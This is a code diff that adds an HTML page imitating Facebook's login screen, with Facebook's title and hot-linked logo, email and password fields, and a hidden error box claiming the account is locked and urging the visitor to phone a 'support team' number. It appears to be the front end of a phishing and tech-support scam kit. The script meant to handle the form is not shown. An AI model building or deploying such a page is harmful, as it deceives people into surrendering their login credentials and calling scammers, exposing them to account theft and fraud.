@@ -1,1 +1,39 @@
-hello
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="main-wrapper">
+        <div class="container">
+            <div class="brand-section">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCuqIDL_pX.svg" alt="Facebook" class="fb-logo">
+                <h2 class="tagline">Facebook helps you connect and share with the people in your life.</h2>
+            </div>
+
+            <div class="login-section">
+                <div class="login-card">
+                    <div id="error-message" class="error-box" style="display: none;">
+                        Your account is locked due to security issues. Please contact support team at 
+                        <a href="tel:+1000000" class="highlight-link">+1XXXXXX</a>
+                    </div>
+
+                    <form id="loginForm">
+                        <input type="text" id="email" placeholder="Email address or mobile number" required>
+                        <input type="password" id="password" placeholder="Password" required>
+                        <button type="submit" class="login-btn">Log in</button>
+                        <a href="#" class="forgot-link">Forgotten password?</a>
+                        <hr>
+                        <button type="button" class="create-btn">Create new account</button>
+                    </form>
+                </div>
+                <p class="footer-note"><b>Create a Page</b> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
